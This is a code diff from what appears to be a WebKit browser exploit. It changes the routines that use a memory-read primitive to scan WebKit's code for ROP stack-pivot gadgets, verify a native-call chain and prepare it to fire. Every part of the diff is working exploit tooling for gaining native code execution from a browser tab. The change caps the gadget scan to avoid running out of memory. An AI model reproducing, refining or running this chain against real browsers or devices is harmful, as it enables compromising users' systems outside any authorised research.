@@ -74,7 +74,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830af";
+const BUILD_ID = "rw-20250830ag";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -1314,9 +1314,10 @@ function logPivotBadBytes(p, webkitBase, off, labels) {
     }
 }
 
-/** Sync scan for full G0-G4 when verify fails at HW RVAs. */
-function scanPivotFullForBad(p, webkitBase, off, badLabels) {
+/** Never sync-scan low .text from Verify — millions of reads OOM the tab. Use Scan pivot (auto). */
+function scanPivotFullNearOnly(p, webkitBase, off, badLabels, maxSteps) {
     const hits = {};
+    maxSteps = maxSteps || 512;
     for (let i = 0; i < badLabels.length; i++) {
         const lab = badLabels[i].split(" ")[0];
         if (lab === "G5" || lab === "MOV_RDI_RAX") continue;
@@ -1326,34 +1327,22 @@ function scanPivotFullForBad(p, webkitBase, off, badLabels) {
         const pat = pivotExecPattern(lab, off);
         if (!pat) continue;
         const hint = off[key] != null ? off[key] : pivotHint(key);
+        if (hint <= 0) continue;
         const cap = scanCapOff();
-        const ranges = [];
-        if (hint > 0) {
-            ranges.push({
-                lo: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
-                hi: Math.min(cap, hint + SCAN_NEAR_RADIUS),
-                tag: "near",
-            });
-        }
-        const cluster = pivotClusterRange(off);
-        if (cluster) ranges.push({ lo: cluster.minRva, hi: cluster.maxRva, tag: "cluster" });
-        ranges.push({ lo: SCAN_PIVOT_MIN, hi: Math.min(SCAN_LOW_MAX, cap), tag: "low" });
+        const lo = Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS);
+        const hi = Math.min(cap, hint + SCAN_NEAR_RADIUS);
         let found = null;
-        for (let ri = 0; ri < ranges.length && found == null; ri++) {
-            const { lo, hi, tag } = ranges[ri];
-            for (let rva = lo & ~7; rva < hi; rva += 8) {
-                if (checkPivotBytes(a => read1p(p, a), webkitBase, rva, pat)) {
-                    found = { rva, tag };
-                    break;
-                }
+        let steps = 0;
+        for (let rva = lo & ~7; rva < hi && steps < maxSteps; rva += 8, steps++) {
+            if (checkPivotBytes(a => read1p(p, a), webkitBase, rva, pat)) {
+                found = rva;
+                break;
             }
         }
-        if (found) {
-            hits[key] = found.rva;
-            mark("PIVOT-FULL-HIT", lab + " +0x" + found.rva.toString(16)
-                + " (" + found.tag + ") was +0x" + (hint || 0).toString(16));
-        } else {
-            mark("PIVOT-FULL-MISS", lab + " — no full gadget in near/cluster/low");
+        if (found != null) {
+            hits[key] = found;
+            mark("PIVOT-FULL-HIT", lab + " +0x" + found.toString(16)
+                + " (near) was +0x" + hint.toString(16));
         }
     }
     if (Object.keys(hits).length) {
@@ -2491,29 +2480,21 @@ function verifyPivotManual(fromScan) {
             return lab !== "G5" && lab !== "MOV_RDI_RAX";
         });
         if (needScan.length) {
-            mark("PIVOT-FULL-SCAN", "G0-G4 bad — sync scan then chunked rescan if needed…");
-            const synced = scanPivotFullForBad(p, webkitBase, off, needScan);
-            if (synced) {
-                off = loadEffectiveOff();
-                const v2 = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
-                if (v2.pivot.good.length)
-                    mark("PIVOT-OK", v2.pivot.good.join(", "));
-                if (v2.pivot.bad.length) {
-                    mark("PIVOT-BAD", v2.pivot.bad.join(", "));
-                    logPivotBadBytes(p, webkitBase, off, v2.pivot.bad);
-                }
-                pivotReady = v2.ok;
-                if (v2.ok) {
-                    mark("PIVOT-READY", v2.pivot.count + "/" + v2.pivot.total
-                        + " pivot + " + v2.popGood.length + " pop (full-pattern RVAs)");
-                    state("chain OK — bisect N2→N5 or Fire smoke", "ok");
-                    setUi();
-                    return;
-                }
+            mark("PIVOT-HINT", "G0-G4 bad — tap Scan pivot (auto) for chunked full scan (do NOT rescan from Verify)");
+            scanPivotFullNearOnly(p, webkitBase, off, needScan, 512);
+            off = loadEffectiveOff();
+            const vNear = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+            if (vNear.ok) {
+                mark("PIVOT-READY", vNear.pivot.count + "/" + vNear.pivot.total
+                    + " pivot + " + vNear.popGood.length + " pop (near hit)");
+                pivotReady = true;
+                state("chain OK — bisect N2→N5 or Fire smoke", "ok");
+                setUi();
+                return;
             }
-            mark("PIVOT-HINT", "tap Scan pivot (auto) — HW G0-G4 are prefix-only/wrong");
-            if (!fromScan && !scanPivotAuto)
-                runPivotScanAuto();
+            if (vNear.pivot.good.length)
+                mark("PIVOT-OK", vNear.pivot.good.join(", "));
+            state("G0-G4 need Scan pivot (auto)", "warn");
             setUi();
             return;
         }
